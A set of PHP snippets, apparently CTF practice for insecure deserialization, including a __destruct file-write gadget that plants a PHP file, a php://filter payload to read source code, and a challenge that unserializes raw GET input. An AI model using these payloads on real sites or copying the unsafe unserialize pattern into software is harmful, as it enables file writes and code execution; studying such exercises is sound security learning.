
<?php 
class foo { 
	public $file = "test.txt"; 
	public $data = "123456"; 
	function __destruct() { 
		file_put_contents($this->file, $this->data); 
	} 
} 

$f = new foo();
$f->file = "xx.php"; 
$f->data = "<?php phpinfo(); ?>"; 
echo base64_encode(serialize($f)); 
?>


O:4:"Read":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=f1a9.php";}
<?php
$d='O:4:"Read":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=f1a9.php";}';
$tc = unserialize($d); 
var_dump($tc); 

?>

<?php
	#php序列化
class oo {
    var $enter;
    var $secret;
}
$o = new oo();
$o->secret = 20;
$o->eneter = 20;
echo serialize($o);
?>

<?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass);

    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}
?>